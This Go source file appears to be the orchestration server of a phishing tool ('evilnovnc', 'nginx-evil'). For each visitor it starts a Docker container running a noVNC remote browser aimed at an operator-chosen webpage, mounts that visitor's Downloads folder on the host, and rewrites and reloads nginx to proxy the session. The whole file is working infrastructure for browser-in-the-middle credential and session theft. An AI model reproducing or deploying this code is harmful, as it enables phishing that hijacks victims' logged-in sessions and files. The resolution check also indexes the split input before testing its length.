package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	network "github.com/docker/docker/api/types/network"
	"github.com/docker/docker/client"
	"github.com/google/uuid"
)

func getText(server string, first bool) string {
	text := `
    
        location /_server_ {
            proxy_pass http://_server_:5980/;
        }
        location /_server_/websockify {
            proxy_pass http://_server_:5980/_server_/websockify;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "Upgrade";
            proxy_set_header Host $host;
        }
        
        location /core/ {
        rewrite /core/(.*) /_server_/core/$1 break;
        proxy_pass http://_server_:5980;
        }
        location /vendor/ {
        rewrite /vendor/(.*) /_server_/vendor/$1 break;
        proxy_pass http://_server_:5980;
        }
    }`

	text2 := `
    
        location /_server_ {
            proxy_pass http://_server_:5980/;
        }
        location /_server_/websockify {
            proxy_pass http://_server_:5980/_server_/websockify;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "Upgrade";
            proxy_set_header Host $host;
        }
    }`

	if first {
		return strings.Replace(text, "_server_", server, -1)
	} else {
		return strings.Replace(text2, "_server_", server, -1)
	}
}

func writeFile(text string) error {
	cmd := "head -n -1 /etc/nginx/conf.d/default.conf"
	output, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return err
	}

	content := string(output) + text

	f, err := os.OpenFile("/etc/nginx/conf.d/default.conf", os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(content)
	if err != nil {
		return err
	}

	err = exec.Command("nginx", "-s", "reload").Run()
	if err != nil {
		return err
	}

	return nil
}

func checkNumDocker() (int, error) {
	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		return 0, err
	}
	containers, err := cli.ContainerList(ctx, types.ContainerListOptions{})
	if err != nil {
		return 0, err
	}
	num := 0
	for _, container := range containers {
		if container.Image == "evilnovnc" {
			num += 1
		}
	}
	return num, nil
}

func runDocker(uuid string, resolution string, folder string, webpage string) error {
	imageName := "evilnovnc"
	envvars := []string{fmt.Sprintf("FOLDER=%s", uuid), fmt.Sprintf("RESOLUTION=%sx24", resolution), fmt.Sprintf("WEBPAGE=%s", webpage)}
	volumes := []string{fmt.Sprintf("%s/Downloads/%s/:/home/user/Downloads", folder, uuid)}

	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())

	if err != nil {
		return err
	}

	gatewayConfig := &network.EndpointSettings{
		Gateway: "nginx-evil",
	}

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image: imageName,
		Env:   envvars,
	}, &container.HostConfig{
		Binds: volumes,
	}, &network.NetworkingConfig{
		EndpointsConfig: map[string]*network.EndpointSettings{
			"nginx-evil": gatewayConfig,
		},
	}, nil, uuid)

	if err != nil {
		return err
	}
	return cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{})
}

func resoHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/reso" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	id := uuid.New()
	resolution := r.URL.Query().Get("x")
	resSplit := strings.Split(resolution, "x")

	_, err1 := strconv.Atoi(resSplit[0])
	_, err2 := strconv.Atoi(resSplit[1])
	if err1 != nil || err2 != nil || len(resSplit) != 2 {
		w.Write([]byte("error"))
		return
	}

	folder := os.Args[1]
	webpage := os.Args[2]
	err := runDocker(id.String(), resolution, folder, webpage)
	if err != nil {
		w.Write([]byte("error"))
		return
	}

	num, err := checkNumDocker()
	if err != nil {
		w.Write([]byte("error"))
		return
	}

	text := getText(id.String(), num <= 1)
	err = writeFile(text)
	if err != nil {
		w.Write([]byte("error"))
		return
	}

	w.Write([]byte(id.String()))
}

func main() {
	http.HandleFunc("/reso", resoHandler)

	fmt.Printf("Starting server at port 8080\n")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}
